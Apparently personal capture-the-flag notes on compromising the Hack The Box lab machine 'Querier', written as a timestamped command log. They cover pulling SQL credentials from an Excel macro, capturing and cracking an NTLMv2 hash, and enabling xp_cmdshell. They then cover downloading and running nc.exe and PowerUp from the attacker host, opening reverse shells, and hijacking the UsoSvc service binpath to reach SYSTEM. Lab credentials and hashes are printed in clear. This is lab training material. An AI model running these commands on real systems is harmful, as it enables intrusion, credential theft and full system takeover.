```
Querier - HACKTHEBOX -  xfer http
IP: 10.10.10.125

lessons learned:
- MYSQLCLIENT.PY
- JOHN
- enable_xp_cmdshell
- pOWERUP
- invokeAllchecks
- powershell
- xfer http
- haschat
```

```
4:25 PM 1/25/2023

┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -Pn 10.10.10.125

T      STATE    SERVICE       VERSION
110/tcp   filtered pop3
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
445/tcp   open     microsoft-ds?																						# 1ST
1056/tcp  filtered vfo
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM											#2ND
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-01-26T02:18:35
|_Not valid after:  2053-01-26T02:18:35
|_ssl-date: 2023-01-26T02:33:31+00:00; -2s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
2006/tcp  filtered invokator
3001/tcp  filtered nessus
5298/tcp  filtered presence
6005/tcp  filtered X11:5
7007/tcp  filtered afs3-bos
8994/tcp  filtered unknown
50389/tcp filtered unknown
54045/tcp filtered unknown

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -3s
| smb2-time: 
|   date: 2023-01-26T02:33:24
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 884.70 seconds
```

```
4:34 PM 1/25/2023
──(root㉿kali)-[/home/kali]
└─# smbclient -L \\\\10.10.10.125      
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
4:35 PM 1/25/2023
┌──(root㉿kali)-[/home/kali]																							# ANONYMOUS LOGIN
└─# smbclient \\\\10.10.10.125\\Reports
Password for [WORKGROUP\kali]:


smb: \> ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019
```

```
4:38 PM 1/25/2023
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (10.1 KiloBytes/sec) (average 10.1 KiloBytes/sec)
smb: \> exit
```

```
4:48 PM 1/25/2023
have to look at macros in excel sheet, Im not doing that going to watch walkthrough because dont want to enable macrros for document on my computer and maybe get a virus
```

```
4:55 PM 1/25/2023																																					# put binwalk into notes.

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/qeurier]
└─# binwalk Currency\ Volume\ Report.xlsm  
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 1087, name: [Content_Types].xml
936           0x3A8           Zip archive data, at least v2.0 to extract, compressed size: 244, uncompressed size: 588, name: _rels/.rels
1741          0x6CD           Zip archive data, at least v2.0 to extract, compressed size: 813, uncompressed size: 1821, name: xl/workbook.xml
2599          0xA27           Zip archive data, at least v2.0 to extract, compressed size: 260, uncompressed size: 679, name: xl/_rels/workbook.xml.rels
3179          0xC6B           Zip archive data, at least v2.0 to extract, compressed size: 491, uncompressed size: 1010, name: xl/worksheets/sheet1.xml
3724          0xE8C           Zip archive data, at least v2.0 to extract, compressed size: 1870, uncompressed size: 8390, name: xl/theme/theme1.xml
5643          0x160B          Zip archive data, at least v2.0 to extract, compressed size: 676, uncompressed size: 1618, name: xl/styles.xml
6362          0x18DA          Zip archive data, at least v2.0 to extract, compressed size: 3817, uncompressed size: 10240, name: xl/vbaProject.bin
10226         0x27F2          Zip archive data, at least v2.0 to extract, compressed size: 323, uncompressed size: 601, name: docProps/core.xml
10860         0x2A6C          Zip archive data, at least v2.0 to extract, compressed size: 400, uncompressed size: 794, name: docProps/app.xml
12207         0x2FAF          End of Zip archive, footer length: 22
```

```
4:57 PM 1/25/2023																																					# extracted all files
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/qeurier]
└─# binwalk -e Currency\ Volume\ Report.xlsm --run-as=root
/usr/lib/python3/dist-packages/llvmlite/llvmpy/__init__.py:3: UserWarning: The module `llvmlite.llvmpy` is deprecated and will be removed in the future.
  warnings.warn(
/usr/lib/python3/dist-packages/llvmlite/llvmpy/core.py:8: UserWarning: The module `llvmlite.llvmpy.core` is deprecated and will be removed in the future. Equivalent functionality is provided by `llvmlite.ir`.
  warnings.warn(
/usr/lib/python3/dist-packages/llvmlite/llvmpy/passes.py:17: UserWarning: The module `llvmlite.llvmpy.passes` is deprecated and will be removed in the future. If you are using this code, it should be inlined into your own project.
  warnings.warn(

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 1087, name: [Content_Types].xml
936           0x3A8           Zip archive data, at least v2.0 to extract, compressed size: 244, uncompressed size: 588, name: _rels/.rels
1741          0x6CD           Zip archive data, at least v2.0 to extract, compressed size: 813, uncompressed size: 1821, name: xl/workbook.xml
2599          0xA27           Zip archive data, at least v2.0 to extract, compressed size: 260, uncompressed size: 679, name: xl/_rels/workbook.xml.rels
3179          0xC6B           Zip archive data, at least v2.0 to extract, compressed size: 491, uncompressed size: 1010, name: xl/worksheets/sheet1.xml
3724          0xE8C           Zip archive data, at least v2.0 to extract, compressed size: 1870, uncompressed size: 8390, name: xl/theme/theme1.xml
5643          0x160B          Zip archive data, at least v2.0 to extract, compressed size: 676, uncompressed size: 1618, name: xl/styles.xml
6362          0x18DA          Zip archive data, at least v2.0 to extract, compressed size: 3817, uncompressed size: 10240, name: xl/vbaProject.bin
10226         0x27F2          Zip archive data, at least v2.0 to extract, compressed size: 323, uncompressed size: 601, name: docProps/core.xml
10860         0x2A6C          Zip archive data, at least v2.0 to extract, compressed size: 400, uncompressed size: 794, name: docProps/app.xml
12207         0x2FAF          End of Zip archive, footer length: 22
```

```
4:57 PM 1/25/2023																																# extraction caused a new directory to be made.
┌──(root㉿kali)-[/home/…/Documents/hackthebox/qeurier/_Currency Volume Report.xlsm.extracted]
└─# ls
 0.zip  '[Content_Types].xml'   docProps   _rels   xl
```

```
5:00 PM 1/25/2023																																	# creds found here
┌──(root㉿kali)-[/home/…/hackthebox/qeurier/_Currency Volume Report.xlsm.extracted/xl]															
└─# cat vbaProject.bin

 0(<Open 0B@rver=<��SELECT * FROM volume; 0%B.6word> 0!> @�� MsgBox "connection successful" 6�A1�$D%FB@H 6B@Bk��Xo��P����������,Set rs = conn.Execute("SELECT * @@version;")����X�kDriver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6 0(:����� further testing required����H������Attribute VB_Name = "ThisWorkbook"
```

```
5:02 PM 1/25/2023																							
┌──(root㉿kali)-[/home/…/hackthebox/qeurier/_Currency Volume Report.xlsm.extracted/xl]
└─# mssqlclient.py QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 																								
# on machine
SQL>enable_xp_cmdshell																				
# how to get a shell but we are not allowed to
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL> 
```

```
5:19 PM 1/25/2023																			
# made a new directory to host as a share drive to the sql server
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/qeurier]
└─# mkdir share
```

```

5:20 PM 1/25/2023																			
#smb2 support because of nmap scan
# hosting smb server now.
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/qeurier]
└─# smbserver.py -smb2support share share/                      
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra
```

```
5:24 PM 1/25/2023																					
# on sql server pulling down hash and pushing it to the smbserver.py that is being hosted
SQL> exec xp_dirtree '\\10.10.16.2\home\kali\Documents\hackthebox\qeurier\share\',1,1

	[*] User QUERIER\mssql-svc authenticated successfully
	[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:28e3461272df2062036d37220c7a2292:0101000000000000804e388f3531d901b4d7d282916e814100000000010010007400630045007900730051007700510003001000740063004500790073005100770051000200100041006b004b00510057004b00720078000400100041006b004b00510057004b007200780007000800804e388f3531d90106000400020000000800300030000000000000000000000000300000764053c035a9f7a85cab16e03add4f528353cf92801a6aa55665e772f94f029e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000
	
	# THIS HASH IS A NTLM V2 HASH

	Capturing MSSQL Credentials - https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
		# explanation on how this works.
```

```		
5:29 PM 1/25/2023
Copied over hash to querier directory named password.txt

	mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:28e3461272df2062036d37220c7a2292:0101000000000000804e388f3531d901b4d7d282916e814100000000010010007400630045007900730051007700510003001000740063004500790073005100770051000200100041006b004b00510057004b00720078000400100041006b004b00510057004b007200780007000800804e388f3531d90106000400020000000800300030000000000000000000000000300000764053c035a9f7a85cab16e03add4f528353cf92801a6aa55665e772f94f029e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000
	# the exact hash.





┌──(root㉿kali)-[/home/kali/Documents/hackthebox/qeurier]
└─# john --format=netntlmv2 password.txt --wordlist=/usr/share/wordlists/rockyou.txt 						#johned the hash to crack it
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)     																			# cracked.
1g 0:00:00:02 DONE (2023-01-25 22:29) 0.4016g/s 3598Kp/s 3598Kc/s 3598K	C/s correforenz..cornamuckla
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

```
5:31 PM 1/25/2023
USE HASHCAT USING MAIN GPU ON COMPUTER TO BREAK HASHES FASTER
```

```
5:37 PM 1/25/2023																			#relogging on with creds better creds with mssqlclient.py
┌──(root㉿kali)-[/home/…/hackthebox/qeurier/_Currency Volume Report.xlsm.extracted/xl]
└─# mssqlclient.py QUERIER/mssql-svc:'corporate568'@10.10.10.125 -windows-auth

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

```
5:39 PM 1/25/2023																						# now able to drop into a command shell with new querier creds.
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

5:41 PM 1/25/2023
SQL> xp_cmdshell dir c:\																
# annoying way to use cmd, going to upload own nc.exe
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 35CB-DA81                                                 

NULL                                                                               

 Directory of c:\                                                                  

NULL                                                                               

09/15/2018  07:19 AM    <DIR>          PerfLogs                                    

01/28/2019  11:55 PM    <DIR>          Program Files                               

01/29/2019  12:02 AM    <DIR>          Program Files (x86)                         

01/28/2019  11:23 PM    <DIR>          Reports                                     

01/28/2019  11:41 PM    <DIR>          Users                                       

01/29/2019  06:15 PM    <DIR>          Windows                                     

               0 File(s)              0 bytes                                      

               6 Dir(s)   3,485,675,520 bytes free                                 

NULL                                       
```

```
5:44 PM 1/25/2023																										# hosting http server to xfer nc.exe
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server                                                                                
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
5:45 PM 1/25/2023														
# could have used certutil, this is powershell way of grabbiong file
xp_cmdshell powershell -c Invoke-WebRequest "http://10.10.16.2:8000/nc.exe" -OutFile "C:\Reports\nc.exe"# had to reset sql login due to xp_cmdshell not working.
```

```
5:54 PM 1/25/2023
(root㉿kali)-[/home/kali/Documents/transfer]																	# worked.
└─# python3 -m http.server                                                                                
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.125 - - [25/Jan/2023 22:53:49] "GET /nc.exe HTTP/1.1" 200 -
```

```
5:56 PM 1/25/2023															
# hosting a reverse shell on the sql server
SQL> xp_cmdshell C:\Reports\nc.exe 10.10.16.2 3333 -e cmd.exe
```

```
6:00 PM 1/25/2023																
# caught reverse shell. On box
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/qeurier]
└─# nc -lvnp 3333               
listening on [any] 3333 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.125] 49679
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc

C:\Windows\system32>


echo IES┌──(root㉿kali)-[/home/kali/Documents/hackthebox/qeurier]
└─# nc -lvnp 3333               
listening on [any] 3333 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.125] 49679
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc

C:\Windows\system32
```

```
6:09 PM 1/25/2023																				
# hosting to xfer powerup.ps1
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.125 - - [25/Jan/2023 23:05:54] "GET /PowerUp.ps1 HTTP/1.1" 200 -
10.10.10.125 - - [25/Jan/2023 23:07:09] "GET /PowerUp.ps1 HTTP/1.1" 200 -
10.10.10.125 - - [25/Jan/2023 23:07:57] "GET /PowerUp.ps1 HTTP/1.1" 200 -
```

```powershell
6:02 PM 1/25/2023								
# Powerup usage, (had to Invoke-AllChecks at end of gedit powerup.ps1)
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8000/PowerUp.ps1') | powershell -noprofile -
# POWERUP RESULTS
C:\Reports>echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8000/PowerUp.ps1') | powershell -noprofile -
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8000/PowerUp.ps1') | powershell -noprofile -

C:\Reports>echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8000/PowerUp.ps1') | powershell -noprofile -
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8000/PowerUp.ps1') | powershell -noprofile -


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2508
ProcessId   : 1788
Name        : 1788
Check       : Process Token Privileges

ServiceName   : UsoSvc																										# looking into this 1st to follow walkthrouygh
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

```
6:12 PM 1/25/2023
sc qc UsoSvc

C:\Reports>sc qc UsoSvc
sc qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p								# can modify path to pop a reverse shell
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
```

```
6:14 PM 1/25/2023
sc config UsoSvc binpath= "C:\Reports\nc.exe 10.10.16.2 5555 -e cmd.exe"
```

```
6:15 PM 1/25/2023
C:\Reports>sc config UsoSvc binpath= "C:\Reports\nc.exe 10.10.16.2 5555 -e cmd.exe"
sc config UsoSvc binpath= "C:\Reports\nc.exe 10.10.16.2 5555 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS																		# reconfigured path

C:\Reports>sc qc UsoSvc
sc qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc																			
# checking path, good to go now have to setup nc.exe and restart svc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Reports\nc.exe 10.10.16.2 5555 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

C:\Reports>
```

```
6:17 PM 1/25/2023															
# setup nc listener
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# nc -lvnp 5555                    
listening on [any] 5555 ...
```

```
6:18 PM 1/25/2023
sc stop UsoSvc
		C:\Reports>sc stop UsoSvc
		sc stop UsoSvc

		SERVICE_NAME: UsoSvc 
				TYPE               : 30  WIN32  
				STATE              : 3  STOP_PENDING 
										(NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
				WIN32_EXIT_CODE    : 0  (0x0)
				SERVICE_EXIT_CODE  : 0  (0x0)
				CHECKPOINT         : 0x3
				WAIT_HINT          : 0x7530




sc start UsoSvc

				C:\Reports>sc start UsoSvc
				sc start UsoSvc
```

```
6:19 PM 1/25/2023													
# caught shell and am system
─# nc -lvnp 5555                    
listening on [any] 5555 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.125] 49683
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
